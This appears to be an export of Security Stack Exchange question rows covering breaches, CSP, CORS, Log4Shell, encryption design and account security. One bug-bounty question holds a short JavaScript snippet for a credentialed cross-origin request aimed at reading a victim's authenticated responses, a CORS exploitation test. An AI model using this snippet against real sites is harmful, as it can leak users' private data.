<p><em>And there are lots of them! Almost every month my email turn up on some breach somewhere and it's always a new site I'm not familiar with</em></p>
<p>How I'am sure I have never visited some of these sites? First the site's URL don't turn up on my browser history and I sync my browser history and seldom cleared it. Second, some of these sites are outright not making any sense for me to visit. Dominos Pizza India? Republican Party of Texas? JD China? I'm not even been in these countries and the default language of  these sites are in language I don't speak.</p>
<p>I know there are ways for me to inadvertently visit these sites (ads network comes to mind, iframe is another). Other party can also use my email address to register to these sites but that should be easily detectable you just check if you are getting confirmation email.</p>
<p>What actually happened here? How do I curb this and prevent this to ever happen again?</p>
","29796","","","","","2021-12-07 09:04:19","My email listed in a breach on sites I do not recognize ever sign into. What happen?","<account-security><data-breaches>","0","5","","","","CC BY-SA 4.0"
"119536","1","","","2016-04-05 13:57:49","","2","111","<p>I work on a banking signature project.</p>

<p>Signing transactions must be carried out on another application to respect the mechanism ""Out Of Band"". When the user makes a transaction, he must pass to a second application (out of band) in which he will find the list of tasks awaiting for signature.</p>

<p>Details:</p>

<p>The existing policy is that the user signs his transactions in the same application, i.e. on the banking application, by entering a SMS OTP.</p>

<p>The current objective is that the signature task should be done in another app, to strengthen security measures.</p>

<p>The user already has an account in the bank app, and should create a new account in the signature app, in order to sign his transactions safely.</p>

<p>After creating the new account, and after authentication, the user should find the list of tasks awaiting for signature, which were transferred from the bank application.</p>

<p>How can I match the user in both applications, so that I can transfer his unique tasks to sign</p>

<p>I do not know how the exchange of data between the two applications (the bank application and the signature app) will work, and how can I secure the signature app?</p>
","106557","","6253","","2016-04-05 14:54:21","2016-04-05 18:01:24","Out of band signature application for banking transactions","<digital-signature><banks><content-security-policy>","0","8","","","","CC BY-SA 3.0"
"45051","1","","","2013-11-06 17:00:27","","1","346","<p>I've recently seen a <a href=""https://www.youtube.com/watch?v=CyX8FfSKg04"" rel=""nofollow"">youtube video</a>, which is advertising an iphone app which will unlock your mac computer by knocking on your iphone. The ad is claiming that it is <strong>faster</strong> and <strong>safer</strong> than typing your password. I am concerned about the security of this method. Can anyone tell me if it is really safer to do so? </p>
","28619","","6253","","2013-11-06 19:13:13","2013-11-06 19:13:13","In what sense is Knock to Unlock safer than a password?","<passwords><macos><security-theater>","2","1","","","","CC BY-SA 3.0"
"45112","1","45113","","2013-11-07 21:15:50","","27","7380","<p>From reading a lot of info on this website I came to the conclusion that if someone with enough skill really badly wants to gain access somewhere, then there is absolutely nothing stopping them from doing so. Additionally I learned that getting access to a company computer is much easier than a singular computer at home.<br></p>

<p>However I am completely confused. What exactly prevents someone from for example, stalking one(or more) of the bank employees, getting information on them and then gaining access into their system? As far as I have seen financial fields have one of the most soul sucking programming tasks which usually end up in small amount of security holes. So what would prevent someone from waltzing into the bank's system, causing gigantic chaos (not for sake of stealing money, but for sake of screwing them up), and then walk out.</p>

<p>For example I know from internal sources that <a href=""http://www.nfcworld.com/2013/07/24/325136/rbc-to-launch-nfc-payments-in-the-cloud/"">this</a> has one of the worst security methods implemented. This makes me assume that this is not the first software that a bank would release that would allow data to be stolen and/or modified.</p>

<p>Does this actually happen but the banks do not care because they suffer very small damages? Or is a bank completely impossible to get into and destroy data?</p>
","27627","","","","","2019-08-25 00:05:13","Why don't banks get hacked?","<penetration-test><data-leakage><security-theater>","8","7","","","","CC BY-SA 3.0"
"257949","1","257954","","2021-12-13 23:15:57","","0","357","<p>&quot;The HTTP Cross-Origin-Opener-Policy (COOP) response header allows you to ensure a top-level document does not share a browsing context group with cross-origin documents.&quot;</p>
<p>In a situation where <a href=""http://www.attacker.com"" rel=""nofollow noreferrer"">www.attacker.com</a> opens <a href=""http://www.tagetwebsite.com"" rel=""nofollow noreferrer"">www.tagetwebsite.com</a>
or
<a href=""http://www.attacker.com"" rel=""nofollow noreferrer"">www.attacker.com</a> embeds a iframe with <a href=""http://www.tagetwebsite.com"" rel=""nofollow noreferrer"">www.tagetwebsite.com</a></p>
<p>I imagine SOP already take care of the restriction, since they have different origins.. violators shouldn't be able to access separate origin content even if attacker is the top level document. why is COOP is needed on top of this? Thank you!</p>
","271443","","271443","","2021-12-13 23:25:28","2021-12-14 05:17:34","What is the difference between Cross Origin Opener Policy and SOP?","<http><web><content-security-policy><cors>","1","1","","","","CC BY-SA 4.0"
"258009","1","","","2021-12-15 11:20:42","","2","422","<p>I am building an E2EE chat app where there is one asymmetric key pair per group. Each user also has one asymmetric key pair. All messages in a group chat are encrypted with the group public key and decrypted with the group private key.</p>
<p>When Alice is added to the group, Bob (one of the group admins) encrypts the group's private key for Alice with her public key. For want of a better term, let's call this encrypted form of the group private key the &quot;encrypted group private key&quot;. The encrypted group private key can only be decrypted using Alice's private key. It is therefore safe to store on my server. Bob creates this encrypted group private key locally and then sends it up for storage on my server.</p>
<pre><code>// on Bob's device
encryptedGroupPrivateKey = encrypt(data: groupPrivateKey, publicKey: alicePublicKey)
</code></pre>
<p>My server in this case is just a plain key-value store of encrypted private keys on the cloud. Later, Alice can download the encrypted group private key and decrypt it to reveal the raw group private key and use that to read messages of the group.</p>
<p>When Bob sends up the encrypted group private key to my server, how can I verify that what Bob has sent me does indeed contain the group private key and not some garbage? Otherwise, my server would dutifully store the garbage for Alice but when Alice comes to decrypt the encrypted group private key she finds out the contents are not the group private key and is not able to read the messages of the group.</p>
<p>My first thought is to hash the group private key when the group is created and store the hashed version on my server and somehow later compare this hash with that of the encrypted group private key. How might this work?</p>
<p>I'm looking to have a verify function on my server which is able to</p>
<pre><code>// on my cloud server
verify(encryptedGroupPrivateKey, groupPrivateKeyHash) // returns true
verify(&quot;anything else&quot;, groupPrivateKeyHash) // returns false
</code></pre>
<p>Putting it all together and more generally this is the set of functions I'm looking for:</p>
<pre><code>messageHash = hash(message)
cipherText = encrypt(message, publicKey)

verify(cipherText, messageHash) # returns true
verify(&quot;anything else&quot;, messageHash) # returns false
</code></pre>
","271520","","271520","","2021-12-16 09:46:30","2021-12-16 09:46:30","How can I verify the hash of the plain text without being able to decrypt the cipher text?","<encryption><end-to-end-encryption><security-by-design><public-key>","2","4","","","","CC BY-SA 4.0"
"258023","1","","","2021-12-15 18:28:47","","1","79","<p>We're currently trying to prioritize our mitigations for <a href=""https://nvd.nist.gov/vuln/detail/CVE-2021-44228"" rel=""nofollow noreferrer"">CVE-2021-44228</a>.</p>
<p>The obvious priority is to deal with any Internet facing java (apache?) applications that use a vulnerable log4j library and\or Java binary first.</p>
<p>For multi-user Linux systems, where users may be able to execute any arbitrary Java stack, is this less of a concern.  In other words, is this exploit dependent upon the effective permissions of the account that is running Java\log4j or does it provide and intrinsic way to obtain privilege escalation.</p>
<p>My admin experience tells me, that any remote code execution is going to be bound by the execution context (e.g. permissions) within which the exposed service or application is operating.  If user bob only has write permissions within their home directory, the assumption is that there would be no major systemic effect. (Of course bob might be doing something like mounting a file share where he has full rights to sensitive.corporate.data/allyourbase or something--so yeah, it depends, but I digress).</p>
<p>Is anyone willing to share their thoughts (or point to reputable sources that provide insight) on how the effective permissions of the vulnerable service\process\application impact the recent log4j exploit.</p>
<p>Another question <a href=""https://security.stackexchange.com/questions/257992/at-which-os-privilege-level-log4j-usually-runs"">about service permissions</a> was suggested, but the only response is somewhat subjective and doesn't offer any insight into:</p>
<ol>
<li><p>Does CVE-2021-44228 include privilege escalation capabilities, regardless of execution context?</p>
</li>
<li><p>Is it accurate to say that there is a definite correlation between the execution context of the vulnerable Java stack and the effective severity (potentially a significant reduction in severity)?</p>
</li>
<li><p>Ultimately, the determination needs to come from the maintainers, but if anyone with willing to share any reputable sources, POCs, tests, demos that prove or disprove the impact of execution context I think it would be a huge help for admins like me currently dealing with the ramped uncertainty.</p>
</li>
</ol>
","271546","","271546","","2021-12-15 23:42:25","2021-12-15 23:42:25","Clarification on log4j Service Requirements","<account-security><permissions><process><privileged-account><log4shell>","0","3","","2021-12-16 15:30:07","","CC BY-SA 4.0"
"258034","1","","","2021-12-16 06:26:23","","0","4829","<p>A number with ISD code +92 sent a video via WhatsApp. No text, only a video. About 20 days later, another number with same ISD sent another video.</p>
<p><strong>Should I open the video?</strong></p>
<p>OR</p>
<p><strong>Should I Report and Block?</strong></p>
<p>Moreover, a family member received the videos as well but from different numbers but same ISD. Can't say if we have been sent the same videos as the durations (as seen from notifications) are different. That's all I know.</p>
","271562","","","","","2022-09-14 22:56:22","Unknown numbers sending videos on WhatsApp. What should I do?","<account-security><whatsapp><fraud><scam>","3","0","","","","CC BY-SA 4.0"
"186297","1","186304","","2018-05-22 20:37:26","","7","3676","<p>Is it a good practice, or is it obsolete? I'm asking because I've never managed to remember a single security question, thus I always write down the answers. I think they are useless, long passwords or 2FA is a much better practice.</p>
","178684","","98538","","2018-05-22 21:47:39","2020-01-15 22:50:49","Do security questions make sense?","<account-security><secret-questions>","5","2","","","","CC BY-SA 4.0"
"186381","1","","","2018-05-24 00:54:57","","2","673","<p>I've set up Content-Security-Policy-Report-Only header, and am in report-uri getting relatively high number (several hundred per month) of failed requests on <code>img-src</code> for  suspicious URLs:</p>

<pre><code>https://netanalytics.xyz/metric/
https://netanalitics.space/metric/
https://glganltcs.space
</code></pre>

<p>there are also some which look even more hacked:</p>

<pre><code>script-src on https://etgfsiwxsbxr.ru/d6safundjenk6af/29915.js
connect-src on http://gj.track.uc.cn/collect
</code></pre>

<p>and even some supposed style accesses for fonts?!</p>

<pre><code>{
    ""csp-report"": {
        ""blocked-uri"": ""https://fonts.googleapis.com"",
        ""document-uri"": ""https://biciklijade.com/"",
        ""original-policy"": ""default-src 'none'; manifest-src https://biciklijade.com; script-src https://biciklijade.com; style-src https://biciklijade.com; connect-src https://biciklijade.com; form-action https://biciklijade.com; img-src https://biciklijade.com https://*.tile.openstreetmap.org https://*.tile.osm.org data:; report-uri https://biciklijade.report-uri.com/r/d/csp/reportOnly"",
        ""violated-directive"": ""style-src""
    }
}
</code></pre>

<p>Note that I at most specify CSS <code>body { font: 16px/21px Arial, ""Helvetica Neue"", Helvetica, sans-serif; }</code> without ever specifying <code>src</code> to download fonts from google (or anyone else), so IMHO browsers should never be connecting to google to get them, right?</p>

<p>I've checked the code and databases to make sure that they haven't been cracked, and they all look just fine. Browsing the site from Firefox and Chromium with developer console open also does not seem to trigger any CSP violations. The site is mostly hand made and is not supposed to be using any analytics.</p>

<p>Question 1: Do any of those look legitimate to you? They don't to me; and I'd like to move CSP from report-only to real blocking</p>

<p>Question 2: If those are indeed non-legitimate accesses, is it possible they all come from cracked clients, instead of infected website? I've already checked, and website seems clean, but I'd like some reassurances that other people are seeing stuff like that too</p>
","32877","","","","","2018-10-27 22:00:43","Content-Security-Policy suspicious entries in the log","<content-security-policy>","1","2","","","","CC BY-SA 4.0"
"258046","1","","","2021-12-16 13:18:28","","1","196","<p>We are planning to lay out guidelines in our organisation for everyone to follow a secure software development lifecycle. As part of this, we plan to adopt the <a href=""https://www.securityknowledgeframework.org/"" rel=""nofollow noreferrer"">security knowledge framework (SKF)</a> that provides a checklist based on the ASVS standard to determine security requirements.</p>
<p>By specifying the maturity level and selecting the right category, the framework brings down the hundreds of checkpoints to just a few security requirements that the team can then implement.</p>
<p>After adopting the ASVS standard do we need to perform threat-modelling? If so, what value would it add assuming the security requirements determined through ASVS checklist cover the possible threats?</p>
","49458","","6253","","2021-12-16 15:34:06","2021-12-17 09:19:01","Do we need threat modelling after following ASVS standard?","<threat-modeling><security-by-design><asvs>","1","1","","","","CC BY-SA 4.0"
"186512","1","","","2018-05-25 14:14:35","","19","1544","<p>Is it safe to send <code>Content-Security-Policy</code> for dynamically generated pages with <code>text/html</code> and other hypertext content-types only or do I need to send this header for all files including static assets - images, JS and CSS files?</p>
","2339","","2339","","2018-05-25 15:05:32","2018-10-27 10:00:45","Is it safe to send Content-Security-Policy header for text/html content-type only?","<content-security-policy>","1","5","","","","CC BY-SA 4.0"
"258221","1","258225","","2021-12-22 13:19:31","","0","163","<p>I was accessing some sites with the Tor browser. I got the URLs from some site and was hitting them one by one just to explore. Suddenly pages stopped responding but the internet was working fine. Then after a minute or two I get a popup from my phone application asking to enter my PIN to complete a transaction. 10 dollars were to be sent to some company-like name. I cancelled that transaction and received a message from the service provider (which shows that it was real).</p>
<ul>
<li>I want to know how my phone application was accessed.</li>
<li>Can it still happen?</li>
<li>What to do to get rid of it?</li>
<li>Antivirus not detecting anything?</li>
</ul>
","271852","","6253","","2021-12-22 16:55:55","2021-12-22 16:55:55","Someone accessed my phone application in Android 10 and dialled some codes to do some transactions while I was using the Tor browser","<malware><android><account-security>","2","1","","2022-01-05 18:04:18","","CC BY-SA 4.0"
"258373","1","258376","","2021-12-30 02:02:29","","0","95","<p>I'm trying to work out some basic knowledge of rate-limiting for my server security so I know how it works. Seems pretty simple as there are different algorithms as well as IP limiting methods. This is not what my question is about, I will be using packages in the end but, in playing around I have discovered:</p>
<p>If I google or use any search to check my IP i get my public address (VPN)</p>
<ul>
<li>Example: 198.8.92.83 (or whatever the VPN session address is) (not actual address)</li>
</ul>
<p>I check my VPN address in my network settings</p>
<ul>
<li>Example: 10.11.3.2 (this seems to not change when VPN session is
toggled) (not actual address)</li>
</ul>
<p>My private address is never seen anywhere.</p>
<ul>
<li>Example: 188.177.3.88 (not actual address)</li>
</ul>
<p>When I query for users IP with middleware on Parse Back4App I get</p>
<ul>
<li>Example: 10.4.44.234 (not actual address)</li>
</ul>
<p>But this IP 4th number changes every request if my VPN is active or not</p>
<p>This is very confusing, if it's confusing to me (weather a beginner or not) how can an IP rate limiter/blacklister do an effective job when an IP is always changing? Question 1...</p>
<p>Question 2, why is my VPN address different than my IP from my request to my server?</p>
<p>What I'm using to get query address:</p>
<pre><code>app.use(function(req, res, next) {
  req.headers['x-real-ip'] = req.ip;
  next();
});

Parse.Cloud.define('geoLookup', function(request, response) {
  var clientIP = request.headers['x-real-ip'];
});
</code></pre>
<p><a href=""https://absurd.tech/parse-server-client-ip-in-the-cloud-code/"" rel=""nofollow noreferrer"">Reference</a></p>
","249539","","","","","2021-12-30 06:23:14","Basic explanation for why I'm getting different IP addresses when querying for users IP W/without VPN?","<account-security><ip><ddos><denial-of-service>","1","0","","","","CC BY-SA 4.0"
"258377","1","","","2021-12-30 07:12:22","","19","3382","<p>I have faced this situation several times. Some websites are presented as a potential security risk. Should I continue to browse such a webpage?</p>
<p>I am attaching one example, just an example. Actually I need a general answer.</p>
<p>I was trying to find out the specs of some equipment made by Gilardoni, an Italian company. I followed the link from Google, but the browser somehow thinks the website is a potential security risk. I investigated further and found that the webpage is presenting a security certificate that has expired just yesterday. The company is famous in this field, but how do I know that I am not being a victim of an MITM attack or there isn't something phishy going on?</p>
<p><a href=""https://i.stack.imgur.com/j5Xsm.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/j5Xsm.png"" alt=""enter image description here"" /></a></p>
<p><a href=""https://i.stack.imgur.com/931mc.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/931mc.png"" alt=""enter image description here"" /></a></p>
","272135","","","","","2021-12-31 14:23:34","Should I visit a website of a popular company if the browser warns of a potential security risk?","<certificates><account-security><phishing>","3","4","","","","CC BY-SA 4.0"
"120106","1","120156","","2016-04-11 09:43:34","","6","457","<p>I have a Google account with a strong password and 2-factor authentication set up, and I worry about what would happen if I lost my phone with the 2FA app.</p>

<p>I want to set up a recovery option, and I have two choices:</p>

<ul>
<li>Phone number: I've <a href=""http://www.theverge.com/a/anatomy-of-a-hack#att"" rel=""nofollow noreferrer"">read about</a> attackers abusing phone
companies' customer services to compromise the phone number of
victims. It's hard for me to trust my phone company with all of my
online accounts, given that they have the reputation not to take
security seriously,</li>
<li>Another email address: this seems to be the safest option, but it's
pretty obvious that I should not set up 2FA on this account, which
would reduce the security of my main account to a simple password,
which was exactly what 2FA should avoid!</li>
</ul>

<p>My idea is to create an email address that has no link to my main Google account, with a very strong password (like in 256-bits crypto-secure-RNG strong password), and to store its password securely. Is it really more secure than an account without 2FA?</p>
","83600","","98538","","2017-10-17 10:51:14","2017-10-17 10:51:14","What is the safest Google account recovery option?","<authentication><multi-factor><account-security>","2","1","","","","CC BY-SA 3.0"
"258513","1","258514","","2022-01-04 14:55:27","","2","100","<p>While implementing CSP, there are two options.</p>
<ol>
<li>Implement CSP in the HTTP response header</li>
<li>Implement CSP using a meta tag <code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'&quot;&gt;</code></li>
</ol>
<p>Out of the above two, which method is more secure and why? Why the other is less secure?</p>
","192005","","","","","2022-01-04 16:03:32","Which CSP implementation is more secure?","<web-application><penetration-test><appsec><content-security-policy>","1","1","","","","CC BY-SA 4.0"
"258522","1","","","2022-01-04 18:59:44","","1","133","<p>I'm brainstorming a good architecture that allows me to store user generated data from my mobile app securely on my backend server, without forcing the user to remember an encryption password.</p>
<p>The data should only be accessible to the user who generated it, possibly personal data. I need to be able to decrypt it on multiple devices, since the user can log in on multiple devices.</p>
<p>I use <a href=""https://firebase.google.com/docs/auth"" rel=""nofollow noreferrer"">Firebase Authentication</a> for authentication. However, the data is stored on an external backend server.</p>
<p>I want the user data to be encrypted client-side (on the mobile app) before it is sent to my external backend server, and decrypted when it is received.</p>
<p>So the process would be as follows:</p>
<ol>
<li>user logs in to an identity provider (e.g. Google) and then authenticates using Firebase Authentication --&gt; <em>token is used to authenticate to the external backend</em>.</li>
<li>after successful login the <a href=""https://firebase.google.com/docs/firestore"" rel=""nofollow noreferrer"">Firebase Firestore database</a> is checked if an encryption key exists, otherwise an encryption key is generated which is later used to encrypt and decrypt the data.</li>
<li>the key is securely stored on the device and sent to the Firestore database with the correct security settings, so that only the authenticated user can access his own key.</li>
<li>now when the user wants to send his data to the external server for backup, he uses the encryption key and then sends it to the external backend server.</li>
</ol>
<p>Now the scenario when the user logs on to another device:</p>
<ol>
<li>the user logs in via the identity provider and authenticates using Firebase Authentication.</li>
<li>then the stored encryption key is retrieved from the Firebase Firestore database and stored securely on the local device.</li>
<li>the user downloads their encrypted data from the external backend server, decrypts it, and stores it in the database on their local device.</li>
</ol>
<p>With this approach, a potential attacker would have to first hack my external backend server and then also hack the Firebase Firestore database to be able to use the encrypted data.</p>
<p>My only concern here is that the private key would have to be stored on Firebase. I mean, I could additionally encrypt it in the mobile app with a generic cipher known to each app instance, but that could also be easily undone if you really tried to hack the whole system.
Can the Firebase Firestore database be considered a secure store for this key?</p>
<p>I know I could also give the user the option to use a &quot;store password&quot; or something similar so that the encryption key is generated with it, but I really want to avoid that. If the user loses that password, all the data is lost as well. Overall, this approach would also severely impact usability.</p>
<p>My question now is: Is this approach ok in terms of security (separation of encryption key and encrypted data on separate servers)? Or are there any other best practices for these kind of use cases or any additional options you could think of to improve the concept without affecting the user experience?</p>
<p>Kind regards</p>
","272372","","","","","2022-01-04 18:59:44","Your opinion on my encryption security concept for my mobile app using Firebase and an external backend server?","<encryption><authentication><mobile><databases><account-security>","0","0","","2022-01-11 20:15:13","","CC BY-SA 4.0"
"120204","1","","","2016-04-12 04:37:20","","1","235","<p>I recently deployed mod_security module in my Apache Web Server. I know the OWASP CRS rules include tags to categorize attacks but I want to make higher level categories, particularly to identify recon from the generated logs.</p>

<p>Having said that, I want to know if my understanding is correct on the following points:</p>

<ol>
<li>Any HTTP method that is not supported by the application is a scanning/recon attempt. Protocol Anomalies/Missing Headers and the likes also fall in the same category.</li>
<li>Given that the Apache directive <code>ProxyRequests</code> is set to Off, any CONNECT attempts will also lie in scanning/recon. It can not be categorized as Proxy Abuse if the server doesn't entertain proxy requests, right?</li>
<li>The OPTIONS method, from my understanding as well as from what the spec says, sounds like it's made for scanning the methods available. Nmap and other tools of the ilk shoot off OPTIONS requests to find out what the server has to offer. But should I indiscriminately put all the OPTIONS requests under scanning attempts? </li>
<li>How to distinguish legitimate GET requests from malicious ones? And by malicious, I mean ones that are a precursor to an attack? Of course I can correlate all the logs to find links but is there an immediate way? By the user agent? What if the user agent cannot be identified?</li>
</ol>

<p>I apologize for bombarding all the questions simultaneously, but I didn't think it would be a good idea to ask them separately. Rookie mistake, maybe.</p>
","21989","","6253","","2016-04-12 04:38:30","2016-04-12 04:38:30","Identifying recon in web","<web-application><threat-modeling><mod-security>","0","0","","","","CC BY-SA 3.0"
"186929","1","186930","","2018-06-01 13:35:55","","54","37640","<p>I frequently leave accounts logged in on my personal computer because of the immense physical and cryptological barriers a hacker would have to overcome to access my computer. Could a hacker, that knows my IP address and what websites I left logged in, take advantage of this knowledge in any way?</p>

<p>I hear that IP addresses are very dangerous when a malicious user knows them. Would this even be my first concern if someone knew my public IP address?</p>
","179376","","1271","","2019-05-27 14:33:34","2019-06-11 07:18:03","Can a hacker, that knows my IP address, remotely access accounts I have left logged in on my computer?","<ip><account-security>","6","16","","","","CC BY-SA 4.0"
"258628","1","","","2022-01-09 05:17:13","","0","1841","<p>When loggin in to a website, A Bearer token is generated and echoed back from the server in a JSON reponse. After this, each request sends the generated token in the Authorization: BEarer  header.</p>
<p>However, there is a API endpoint which reflects the request Origin header value in Access-Control-Allow-Origin and carries out Access-Control-Allow-Credentials: true to.</p>
<p>I minimize the request to the minimum info needed to make the request successfully and the session is held in the Authorization: Bearer . So, then, I tried to test it for CORS issues to get sensitive info.</p>
<p>But the Cross-domain is not attaching the Authorization header.</p>
<p>I'm using the console in Developer Tools from example.com open.</p>
<p>Using this code:</p>
<pre><code>var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','url', true); 
req.withCredentials = true; req.send(null); 
function reqListener() { 
    alert(this.responseText); 
};
</code></pre>
<p>But still gets HTTP 401 Unauthorized due to the ausence of Authorization header.</p>
<p>Any comments?</p>
","272547","","47524","","2022-01-09 16:14:23","2022-01-09 16:14:23","CORS request is not sending Authorization: Bearer <value> header","<content-security-policy><cors><bug-bounty>","1","0","","","","CC BY-SA 4.0"
"258632","1","258633","","2022-01-09 09:23:18","","13","3926","<p>when I visit &quot;https://www.ebay.co.uk&quot;, I can see a trust seal at the bottom right of the page that says the certificate is issued by DigiCert. It is a clickable trust seal, so when I click on it, it takes me to the DigiCert website.</p>
<p><a href=""https://i.stack.imgur.com/uDkRF.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/uDkRF.png"" alt=""enter image description here"" /></a></p>
<p>My confusion is due to the certificate that ebay website send to my browser. When I click on the padlock in Chrome and check the certificate, it shows me this:</p>
<p><a href=""https://i.stack.imgur.com/lvgB1.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/lvgB1.png"" alt=""enter image description here"" /></a></p>
<p>Intermediate and root CA for the ebay website is from Sectigo. To the best of my understanding Sectigo and DigiCert are two different CAs business. What am I missing here?</p>
","241043","","","","","2022-01-09 09:39:04","SSL Trust Seal of ""https://www.ebay.co.uk""","<certificates><certificate-authority><security-seal>","1","0","","","","CC BY-SA 4.0"
"186954","1","186959","","2018-06-01 19:51:47","","3","354","<p>I'm working on improving the security of an application for something much like paying child support. With that said, if the wrong person gains access to our application, it can become very dangerous for the user. Sadly, there have been several instances where an ex or current spouse gained access to an account, or signed up as one of our users.</p>

<p><strong>The biggest challenge is our demographic:</strong> many of our users are people who need to protect their information from someone they could be living with, work with, knows quite a bit about them, or still shares a device that can be used to access their account. Additionally, some of our users live in very remote areas, and may lack the means to ever meet with a worker in one of our offices. Without a face-to-face interaction, it's hard for us to be certain who is really creating an account or requesting access.  </p>

<p>At the moment, part of our security process includes <strong>sending a letter in the mail</strong> with a verification code. However, many users hate this, as it can take up to two weeks for them to receive the letter. Additionally, if they're still living with their ex or spouse, there's no way to know which one of them will receive the security code. </p>

<p>In regards to <strong>security questions</strong>: which questions would a spouse not know? If anyone could guess the answers, it would be them. Also, if the account was created fraudulently, this would only make things worse for everyone.</p>

<p>We also cannot mandate users to <strong>meet directly with an employee</strong> for verification, as some of our users don't have the means to travel to one of our offices.</p>

<p>When it comes to <strong>using SMS and a cellular number</strong>, there is still concern that a malicious person will just use their number when creating a fraudulent account, or has access to the user's cellphone.</p>

<p><strong>Without being able to meet with a person, how can you best be certain that they are who they say they are, instead of a well-informed ex, when creating an account or requesting a password/username reset?</strong> </p>
","179395","","","","","2018-06-01 22:10:55","Keeping an ex or current spouse from accessing an account","<privacy><account-security>","2","6","","","","CC BY-SA 4.0"
"258870","1","","","2022-01-17 03:07:27","","0","106","<p>I'm doing Red Hat (RHEL 6.5) security settings.
If I set up the two files as shown below, is there no security effect on each other?</p>
<ol>
<li>/etc/pam.d/system-auth</li>
</ol>
<pre><code>password requisite pam_cracklib.so retry=3 minlen=8 lcredit=-1 ucredit=-1 dcredit=-1 ocredit=-1
</code></pre>
<ol start=""2"">
<li>/etc/login.defs</li>
</ol>
<pre><code>PASS_MIN_LEN 5
</code></pre>
<p>Is it okay to set the minimum password length differently as above? I'd appreciate it if you could explain the difference or relevance between the two files.</p>
","272927","","272927","","2022-02-09 00:38:26","2022-02-09 00:38:26","Red Hat Password Security Settings(/etc/pam.d/system-auth, /etc/login.defs)","<passwords><linux><account-security><password-policy>","0","4","","","","CC BY-SA 4.0"
"258906","1","","","2022-01-18 02:02:44","","0","228","<p>I opened Google, and a popup occurred briefly before I reflexively closed it.  I then realized it had said something about a new password saved to the Google Password Manager, I think - which is weird, because I don't use Google's Password Manager.  So I went and checked, and yep, there was one password saved to the manager.  It says it's for Wish.  I then checked a few other things, but google says there've been no new sign ins, and I think all the active sign-ins are mine.  I exported the password list, and it's a little odd - here's a redacted version:</p>
<pre><code>name,url,username,password
,android://[GIBBERISH THAT LOOKS LIKE BASE 64]@com.contextlogic.wish/,[MY EMAIL ADDRESS],
</code></pre>
<p>(The base-64 doesn't decode properly, and the parts of it that do are still gibberish.)</p>
<p>Note that the name and the password field are both apparently blank.  And that the url looks like some kind of custom android URI rather than a proper URL.</p>
<p>I've changed my Google password, just in case, but it's sortof baffling how this could have occurred.  If nobody else was signed in to my account, they shouldn't have been able to add a saved password, and I haven't gone to Wish or clicked any related links in months, AFAIK.  Anybody know what's up?</p>
","125760","","","","","2023-03-25 16:06:15","Google Password I didn't create","<password-management><account-security><google>","0","4","","","","CC BY-SA 4.0"
"258948","1","259146","","2022-01-19 12:24:45","","1","1530","<p>I have been thinking of implementing a new practice where local admin privileges are disabled entirely from all endpoints. For users who need to elevate privileges, they will have a separate admin account dedicated and restricted only to the local administration.</p>
<p>I am thinking about how the passwords will be managed. (Its a longshot but) Is there any way passwords can be centrally managed? E.G if a user forgot their password or needed to reset their password, can this be something done centrally via the AD by calling the helpdesk or would we just have to rely entirely on the users.</p>
<p>Also apart from the malware not being able to run automatically with admin privileges if a compromise occurs which is the primary reason I am implementing this, what other benefits would this provide? Is this even best practice?</p>
","197502","","197502","","2022-01-19 12:29:56","2022-02-08 13:29:05","Is there really any benefit in having a separate local admin account","<passwords><account-security><active-directory><privileged-account><privilege-separation>","3","1","","","","CC BY-SA 4.0"
"259058","1","","","2022-01-23 20:16:49","","0","114","<p>I'm on my laptop at home and I wasn't logged into any Google account but I was on my school's Microsoft account. Can the school still see my searches?</p>
","273256","","129883","","2022-01-24 14:40:28","2022-01-24 14:40:28","Can my school see what I searched for while logged in?","<privacy><account-security>","0","3","","","","CC BY-SA 4.0"
"259086","1","259087","","2022-01-25 10:17:18","","2","256","<p>Consider a scenario where CSP is configured in response headers rather than using meta tag. And only one directive is used.</p>
<p><code>Content-Security-Policy: report-uri https://www.example.com</code></p>
<p>Does the above directive where only report-uri is used works fine and prevent any violations? Or report-uri is used only along with default-src directives?</p>
","192005","","","","","2022-01-25 11:00:29","Report-URI CSP Directive","<web-application><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"187436","1","187634","","2018-06-09 17:09:07","","19","1062","<blockquote>
  <p>This is an attempt to ask a canonical question to <a href=""https://security.stackexchange.com/questions/138606/help-my-home-pc-has-been-infected-by-a-virus-what-do-i-do-now"">expand upon another post with a similar name</a>. The goal is to create something helpful that can be used as a duplicate when non experts ask about <em>personal</em> credentials being stolen.</p>
</blockquote>

<p>Let's say that I have determined beyond doubt that a malicious party had root access to my computer.  Lets assume that the computer has since been recovered (virus free) ... but it is likely that any personal information on the box was stolen.</p>

<ul>
<li>What do I do now?  How do I protect myself?</li>
<li>How secure are auto-saved passwords in a browser?</li>
<li>How secure are passwords that have been saved in a password manager? </li>
<li>Do passwords really need to reset for all accounts?</li>
<li>Do all Credit Cards used with this computer need to be cancled?</li>
<li>What about archived Tax Paperwork (with SSN &amp; Bank Info)?</li>
<li>Do friends and other contacts need to be notified to prevent them getting scammed by the attacker pretending to be me on Social Media?</li>
<li>What other attack vectors should be considered.</li>
</ul>
","92213","","92213","","2018-06-16 02:36:27","2018-06-16 02:36:27","Help! My information has been stolen! What do I do now?","<passwords><account-security><identity-theft><social-media>","4","2","","","","CC BY-SA 4.0"
"259135","1","","","2022-01-27 05:59:21","","1","80","<p>Microsoft Authenticator requires an:</p>
<ul>
<li>Outlook account</li>
<li>Verification account</li>
<li>iCloud account</li>
</ul>
<p>The first two are required to set up the authenticator on a new device, the latter stores all the data to be restored.</p>
<p>Ideally, your &quot;verification account&quot; should be supported by a further &quot;restoration account&quot; that can be used to restore its forgotten passwords etc. This account should not be one of the other accounts linked to Microsoft Authenticator as, if these are breached they can simply be used to change the password of the &quot;verification account&quot; and bypass the verification step. This account should also not be in the file manager in case this is breached.</p>
<p>In summary, I'm asking whether it is necessary/ideal to have a complete divorce between the accounts in the file manager and those required to setup the 2fa on a new device. Would a further &quot;restoration&quot; account associated with your &quot;verification account&quot; but not with 2fa directly also be useful?</p>
<p>I would be happy to learn I don't need to memorize 4 additional complex passwords.</p>
","273438","","6253","","2022-01-27 09:27:42","2022-01-27 09:27:42","Is it necessary to have keep these 4 accounts separate from password manager?","<authentication><passwords><account-security><one-time-password>","0","1","","","","CC BY-SA 4.0"
